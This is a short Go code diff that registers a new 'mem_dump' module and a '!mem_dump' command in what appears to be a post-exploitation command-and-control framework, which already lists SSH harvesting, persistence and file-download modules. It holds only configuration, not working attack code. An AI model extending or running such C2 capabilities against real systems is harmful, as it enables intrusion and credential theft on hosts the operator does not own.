@@ -95,6 +95,7 @@ const (
 	ModSSHHarvester = "ssh_harvester"
 	ModFileServer   = "file_server"
 	ModDownloader   = "file_downloader"
+	ModMemDump      = "mem_dump"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
@@ -342,6 +343,18 @@ var Modules = map[string]*ModConfig{
 			"checksum":      {"SHA256 checksum of the file, used to verify integrity, wont't check if empty"},
 		},
 	},
+	ModMemDump: {
+		Name:          ModMemDump,
+		Exec:          "built-in",
+		Platform:      "Generic",
+		IsInteractive: false,
+		Author:        "jm33-ng",
+		Date:          "2020-01-25",
+		Comment:       "Dump memory regions of a process",
+		Options: map[string][]string{
+			"pid": {"PID of the target process"},
+		},
+	},
 }
 
 // C2Commands
@@ -364,6 +377,7 @@ const (
 	C2CmdListener       = "!listener"
 	C2CmdFileServer     = "!file_server"
 	C2CmdFileDownloader = "!file_downloader"
+	C2CmdMemDump        = "!mem_dump"
 )
 
 // AgentSystemInfo agent properties
